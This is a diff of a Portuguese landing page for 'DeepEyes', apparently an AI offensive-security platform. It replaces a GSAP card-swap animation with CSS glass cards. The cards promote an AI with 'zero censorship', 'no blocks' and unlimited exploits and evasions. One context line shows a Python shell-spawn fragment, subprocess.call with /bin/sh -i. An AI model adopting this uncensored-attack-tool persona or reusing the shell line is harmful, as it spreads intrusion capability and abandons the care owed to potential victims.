@@ -10,7 +10,6 @@
     <meta name="theme-color" content="#0a0a0f">
     <meta name="description" content="DeepEyes - Plataforma de IA especializada em segurança ofensiva. Pentest, Red Team e simulações APT em ambiente controlado.">
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -725,89 +724,122 @@
             line-height: 1.6;
         }
 
-        /* Card Swap Effect */
-        .card-swap-wrapper {
+        /* Glass Cards Effect */
+        .glass-container {
             position: relative;
-            width: 100%;
-            height: 500px;
             display: flex;
             justify-content: center;
             align-items: center;
+            padding: 40px 0;
             margin-bottom: 50px;
         }
 
-        .card-swap-container {
+        .glass-card {
+            position: relative;
+            width: 200px;
+            height: 240px;
+            background: linear-gradient(rgba(255, 255, 255, 0.1), transparent);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 25px rgba(0, 0, 0, 0.25);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border-radius: 16px;
+            margin: 0 12px;
+            backdrop-filter: blur(10px);
+            padding: 20px;
+        }
+
+        .glass-card::before {
+            content: attr(data-text);
             position: absolute;
             bottom: 0;
-            right: 50%;
-            transform: translate(50%, 10%);
-            transform-origin: center center;
-            perspective: 900px;
-            overflow: visible;
-            width: 380px;
-            height: 320px;
+            width: 100%;
+            height: 50px;
+            background: rgba(0, 212, 255, 0.1);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-weight: 600;
+            font-size: 1rem;
+            border-radius: 0 0 16px 16px;
         }
 
-        .swap-card {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 380px;
-            height: 320px;
-            padding: 35px 30px;
-            background: linear-gradient(145deg, #1a1a24 0%, #0d0d12 100%);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 16px;
-            text-align: center;
-            transform-style: preserve-3d;
-            will-change: transform;
-            backface-visibility: hidden;
-            -webkit-backface-visibility: hidden;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
-        }
-
-        .swap-card .nr-icon {
-            width: 70px;
-            height: 70px;
+        .glass-card .glass-icon {
+            width: 60px;
+            height: 60px;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: linear-gradient(135deg, rgba(0, 212, 255, 0.15), rgba(0, 255, 136, 0.1));
-            border: 1px solid rgba(0, 212, 255, 0.3);
-            border-radius: 18px;
-            color: var(--accent-cyan);
-            margin: 0 auto 24px;
+            margin-bottom: 15px;
         }
 
-        .swap-card .nr-icon svg {
-            filter: drop-shadow(0 0 12px rgba(0, 212, 255, 0.7));
+        .glass-card .glass-icon svg {
+            width: 40px;
+            height: 40px;
+            fill: none;
+            stroke: var(--accent-cyan);
+            stroke-width: 1.5;
+            filter: drop-shadow(0 0 10px rgba(0, 212, 255, 0.6));
         }
 
-        .swap-card h3 {
-            font-size: 1.5rem;
-            font-weight: 700;
-            margin-bottom: 16px;
-            color: #ffffff;
-        }
-
-        .swap-card p {
-            font-size: 1rem;
+        .glass-card p {
+            font-size: 0.8rem;
             color: var(--text-secondary);
-            line-height: 1.7;
+            text-align: center;
+            line-height: 1.5;
+            padding: 0 10px;
+            margin-bottom: 30px;
         }
 
         @media (max-width: 768px) {
-            .card-swap-container {
-                transform: scale(0.75) translate(65%, 15%);
+            .glass-container {
+                flex-wrap: wrap;
+                gap: 15px;
+                padding: 20px 10px;
+            }
+            
+            .glass-card {
+                margin: 0;
+                width: calc(50% - 10px);
+                max-width: 180px;
+                height: 200px;
             }
         }
 
         @media (max-width: 480px) {
-            .card-swap-wrapper {
-                height: 400px;
+            .glass-container {
+                gap: 12px;
             }
-            .card-swap-container {
-                transform: scale(0.6) translate(80%, 20%);
+            
+            .glass-card {
+                width: calc(50% - 8px);
+                max-width: 160px;
+                height: 180px;
+                padding: 15px;
+            }
+            
+            .glass-card p {
+                font-size: 0.7rem;
+                margin-bottom: 25px;
+            }
+            
+            .glass-card::before {
+                height: 38px;
+                font-size: 0.8rem;
+            }
+            
+            .glass-card .glass-icon {
+                width: 50px;
+                height: 50px;
+                margin-bottom: 10px;
+            }
+            
+            .glass-card .glass-icon svg {
+                width: 32px;
+                height: 32px;
             }
         }
 
@@ -2276,36 +2308,30 @@
                                 Sem censura, sem bloqueios, sem limitações.
                             </p>
 
-                            <div class="card-swap-wrapper">
-                                <div class="card-swap-container" id="cardSwap">
-                                    <div class="swap-card" data-index="0">
-                                        <div class="nr-icon">
-                                            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg>
-                                        </div>
-                                        <h3>Zero Censura</h3>
-                                        <p>Acesso completo a todas as técnicas e payloads sem filtros.</p>
+                            <div class="glass-container">
+                                <div class="glass-card" data-text="Zero Censura" style="--r:-15;">
+                                    <div class="glass-icon">
+                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg>
                                     </div>
-                                    <div class="swap-card" data-index="1">
-                                        <div class="nr-icon">
-                                            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>
-                                        </div>
-                                        <h3>Sem Bloqueios</h3>
-                                        <p>A IA responde qualquer pergunta sobre segurança ofensiva.</p>
+                                    <p>Acesso completo a todas as técnicas e payloads sem filtros.</p>
+                                </div>
+                                <div class="glass-card" data-text="Sem Bloqueios" style="--r:-5;">
+                                    <div class="glass-icon">
+                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>
                                     </div>
-                                    <div class="swap-card" data-index="2">
-                                        <div class="nr-icon">
-                                            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 8V4H8"/><rect width="16" height="12" x="4" y="8" rx="2"/><path d="M2 14h2"/><path d="M20 14h2"/><path d="M15 13v2"/><path d="M9 13v2"/></svg>
-                                        </div>
-                                        <h3>IA Especializada</h3>
-                                        <p>Treinada para operações de Red Team e Pentest.</p>
+                                    <p>A IA responde qualquer pergunta sobre segurança ofensiva.</p>
+                                </div>
+                                <div class="glass-card" data-text="IA Especializada" style="--r:5;">
+                                    <div class="glass-icon">
+                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M12 8V4H8"/><rect width="16" height="12" x="4" y="8" rx="2"/><path d="M2 14h2"/><path d="M20 14h2"/><path d="M15 13v2"/><path d="M9 13v2"/></svg>
                                     </div>
-                                    <div class="swap-card" data-index="3">
-                                        <div class="nr-icon">
-                                            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z"/></svg>
-                                        </div>
-                                        <h3>Arsenal Completo</h3>
-                                        <p>Exploits, bypasses e evasões disponíveis sem limites.</p>
+                                    <p>Treinada para operações de Red Team e Pentest.</p>
+                                </div>
+                                <div class="glass-card" data-text="Arsenal Completo" style="--r:15;">
+                                    <div class="glass-icon">
+                                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"><path d="M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z"/></svg>
                                     </div>
+                                    <p>Exploits, bypasses e evasões disponíveis sem limites.</p>
                                 </div>
                             </div>
                         </div>
@@ -3306,123 +3332,6 @@ subprocess.call(["/bin/sh","-i"])</code>
                     });
                 }, 250);
             });
-        })();
-    </script>
-
-    <!-- Card Swap Effect with GSAP -->
-    <script>
-        (function() {
-            if (typeof gsap === 'undefined') return;
-            
-            const container = document.getElementById('cardSwap');
-            if (!container) return;
-
-            const cards = Array.from(container.querySelectorAll('.swap-card'));
-            if (cards.length < 2) return;
-
-            // Configuration
-            const config = {
-                cardDistance: 60,
-                verticalDistance: 70,
-                delay: 5000,
-                skewAmount: 6,
-                ease: 'elastic.out(0.6, 0.9)',
-                durDrop: 2,
-                durMove: 2,
-                durReturn: 2,
-                promoteOverlap: 0.9,
-                returnDelay: 0.05
-            };
-
-            let order = cards.map((_, i) => i);
-
-            // Calculate slot position
-            function makeSlot(i) {
-                return {
-                    x: i * config.cardDistance,
-                    y: -i * config.verticalDistance,
-                    z: -i * config.cardDistance * 1.5,
-                    zIndex: cards.length - i
-                };
-            }
-
-            // Place card immediately
-            function placeNow(card, slot) {
-                gsap.set(card, {
-                    x: slot.x,
-                    y: slot.y,
-                    z: slot.z,
-                    xPercent: -50,
-                    yPercent: -50,
-                    skewY: config.skewAmount,
-                    transformOrigin: 'center center',
-                    zIndex: slot.zIndex,
-                    force3D: true
-                });
-            }
-
-            // Initialize card positions
-            cards.forEach((card, i) => {
-                placeNow(card, makeSlot(i));
-            });
-
-            // Swap animation
-            function swap() {
-                if (order.length < 2) return;
-
-                const [front, ...rest] = order;
-                const frontCard = cards[front];
-
-                const tl = gsap.timeline();
-
-                // Drop front card
-                tl.to(frontCard, {
-                    y: '+=500',
-                    duration: config.durDrop,
-                    ease: config.ease
-                });
-
-                // Promote other cards
-                tl.addLabel('promote', `-=${config.durDrop * config.promoteOverlap}`);
-
-                rest.forEach((idx, i) => {
-                    const card = cards[idx];
-                    const slot = makeSlot(i);
-                    
-                    tl.set(card, { zIndex: slot.zIndex }, 'promote');
-                    tl.to(card, {
-                        x: slot.x,
-                        y: slot.y,
-                        z: slot.z,
-                        duration: config.durMove,
-                        ease: config.ease
-                    }, `promote+=${i * 0.15}`);
-                });
-
-                // Return front card to back
-                const backSlot = makeSlot(cards.length - 1);
-                tl.addLabel('return', `promote+=${config.durMove * config.returnDelay}`);
-
-                tl.call(() => {
-                    gsap.set(frontCard, { zIndex: backSlot.zIndex });
-                }, undefined, 'return');
-
-                tl.to(frontCard, {
-                    x: backSlot.x,
-                    y: backSlot.y,
-                    z: backSlot.z,
-                    duration: config.durReturn,
-                    ease: config.ease
-                }, 'return');
-
-                tl.call(() => {
-                    order = [...rest, front];
-                });
-            }
-
-            // Start first swap and interval
-            swap();
-            setInterval(swap, config.delay);
         })();
     </script>
 </body>
